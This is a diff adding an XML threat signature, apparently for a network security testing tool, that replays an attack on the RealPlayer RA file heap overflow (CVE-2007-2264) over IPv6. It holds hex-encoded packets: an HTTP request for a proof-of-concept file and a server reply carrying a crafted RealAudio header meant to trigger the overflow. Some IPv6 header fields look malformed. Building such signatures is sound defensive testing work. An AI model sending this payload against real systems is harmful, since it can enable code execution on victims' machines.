@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="RealNetworks RealPlayer Multiple Products RA File Processing Heap Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="A heap overflow vulnerability exists in RealNetworks multiple products. The vulnerability is due to boundary errors when processing RealAudio (RA) files. A remote attacker can exploit this vulnerability by enticing the target user to open a crafted RA file. Successful exploitation would cause a heap overflow that may lead to arbitrary code execution in the security context of the logged in user. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="RealNetworks"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="RealNetworks_RealPlayer"/>
+      <item value="RealNetworks_Linux_RealPlayer"/>
+      <item value="RealNetworks_Mac_RealPlayer"/>
+      <item value="RealNetworks_RealOne_Player"/>
+      <item value="RealNetworks_RealPlayer_Enterprise"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="RealNetworks_RealPlayer_8"/>
+      <item value="RealNetworks_RealPlayer_10"/>
+      <item value="RealNetworks_RealPlayer_10.5"/>
+      <item value="RealNetworks_RealOne_Player_V1"/>
+      <item value="RealNetworks_RealOne_Player_V2"/>
+      <item value="RealNetworks_Mac_RealPlayer_10.1"/>
+      <item value="RealNetworks_RealPlayer_Enterprise_1.11"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20071026-07"/>
+    <CVEID display="true" value="CVE-2007-2264"/>
+    <bugtraqID display="true" value="26214"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="b1494803dcae3c89a5febbf7d7dd09da"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-requred"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1236795325"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1204095327" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7E617A68616E672F706F632E726120485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E30290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000000000000485454502F312E3120323030204F4B0D0A446174653A205475652C203036204E6F7620323030372030333A32333A323620474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205475652C203036204E6F7620323030372030333A32333A313220474D540D0A455461673A20223265383533372D63302D3237316263383030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203139320D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20617564696F2F782D7265616C617564696F0D0A0D0A2E7261FD000400002E7261340000008900040FFFFFFF0002000001160000FE1C0001D3AD0001D3AD00010116000000002B1100000010000104496E743004646E65740002001E41697220466F726365204F6E652D2022546865204D6F746F7263616465220F4A6572727920476F6C64736D69746816566172657365205361726162616E64652C203139393700770B53295048C02D2C21F32BA2054CAF8FB38E259073DD32F06426DAF9B0978D92938C0A56905FE438F9551C95E2CA31A4DBC00C" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
